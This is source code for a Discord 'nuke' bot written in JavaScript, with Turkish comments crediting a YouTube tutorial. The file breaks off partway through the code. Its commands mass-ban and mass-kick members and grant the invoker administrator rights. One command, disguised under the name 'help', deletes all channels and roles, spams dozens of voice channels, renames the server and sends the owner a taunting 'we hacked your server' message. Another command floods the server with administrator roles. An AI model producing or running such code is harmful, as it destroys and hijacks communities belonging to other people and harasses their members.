const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**FCRP FCRP TARAFINDAN GÜMLEMİŞTİR** :smiley:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("FCRPMAKEAGAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("MAKE", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("AGAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("FCRP", {
        type: "voice"
      })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("TURİZİM", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("İYİ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("YOLCULUKLAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("DİLER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("😀", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://w1.pngwing.com/pngs/730/282/png-transparent-blue-balloon-github-javascript-react-mean-mixin-yeoman-sass.png");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("FCRP MAKE AGAİN"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://w1.pngwing.com/pngs/730/282/png-transparent-blue-balloon-github-javascript-react-mean-mixin-yeoman-sass.png"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("FCRPMAKEAGAİN");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
});

 //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR

    client.on("message", msg => {
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "FCRPMAKEAGAİN",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
